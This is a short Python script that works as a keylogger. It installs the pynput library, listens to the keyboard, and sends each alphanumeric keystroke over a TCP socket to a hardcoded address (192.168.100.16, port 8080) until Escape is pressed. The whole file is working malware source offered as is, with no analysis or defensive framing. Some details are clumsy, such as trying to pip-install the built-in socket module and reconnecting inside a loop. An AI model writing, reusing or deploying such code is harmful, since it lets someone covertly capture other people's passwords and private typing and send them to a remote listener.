import socket
from pynput import keyboard
import subprocess

def install_required_module():
    modules = ['pynput', 'socket']
    for module in modules:
        try :
            subprocess.check_call(["pip", "install", module])
            print(f"Successfully installed {module}")
        except:
            pass
install_required_module()

host = '192.168.100.16'
port = 8080

def on_press(key,socket):
    try:
        print(f"alphanumeric key {key.char} pressed".format(key.char))
        char_key = key.char
        socket.sendall(bytes(char_key, 'utf-8'))
    except AttributeError:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False




socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try :
    while True:
        socket.connect((host,port))


        with keyboard.Listener(on_press=lambda k: on_press(k, socket), on_release=on_release) as listener:
            listener.join()
        # print("Received from server : ", data.decode('utf-8'))


except ConnectionRefusedError:
    print("Connection refused, Ensure that server is running.")
